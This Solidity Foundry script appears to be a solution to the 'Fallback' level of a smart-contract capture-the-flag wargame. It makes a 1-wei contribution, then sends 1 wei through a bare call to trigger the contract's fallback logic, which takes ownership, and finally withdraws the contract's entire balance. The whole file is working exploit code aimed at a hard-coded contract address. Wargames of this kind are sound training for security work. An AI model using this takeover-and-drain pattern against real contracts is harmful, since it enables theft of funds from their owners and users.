// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
//import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";
import "../src/levels/01-Fallback/Fallback.sol";

contract ExploitScript is Script {
    Fallback level1 = Fallback(payable(0x76ee97aC9A91BA9fAE43400a8d4F2074E0e5E248));

    function run() public {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}();
        level1.contributions(0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB);
        level1.getContribution();
        address(level1).call{value: 1 wei}(""); //send 1
        level1.owner();
        level1.withdraw();
        
        vm.stopBroadcast();
    }
}